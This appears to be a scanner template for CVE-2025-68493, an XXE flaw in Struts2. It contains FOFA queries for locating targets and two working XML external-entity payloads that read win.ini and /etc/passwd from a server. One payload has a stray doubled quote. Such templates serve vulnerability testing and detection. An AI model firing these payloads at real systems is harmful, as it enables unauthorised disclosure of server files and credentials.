id: CVE-2025-68493

info:
  name: Struts2 S2-069 XXE 漏洞
  author: zan8in
  severity: high
  verified: true
  description: |
    漏洞原因在于XWork对 XML的配置处理不当，导致系统极易受到 XML 外部实体 (XXE) 注入攻击，攻击者可以利用这个漏洞读取服务器上任意文件，泄漏敏感信息，或者执行拒绝服务（DoS）攻击。
    fofa: app="Struts2"
    fofa title="E-Business Suite"
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-68493
    - https://mp.weixin.qq.com/s/ldpVaQBuEvmu9wqtJ79xLA
  tags: cve,cve2025,struts2,xxe
  created: 2026/01/14

rules:
  r0:
    request:
      method: POST
      path: /struts2-xml-parser/xmlParserNoDtdParse
      body: |
        <?xml version="1.0"?>
        <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c://windows/win.ini"">]>
        <root>&xxe;</root>
    expression: response.body.bcontains(b"bit app support") && response.body.bcontains(b"extensions")
  r1:
    request:
      method: POST
      path: /struts2-xml-parser/xmlParserNoDtdParse
      body: |
        <?xml version="1.0"?>
        <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <root>&xxe;</root>
    expression: |
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0() || r1()
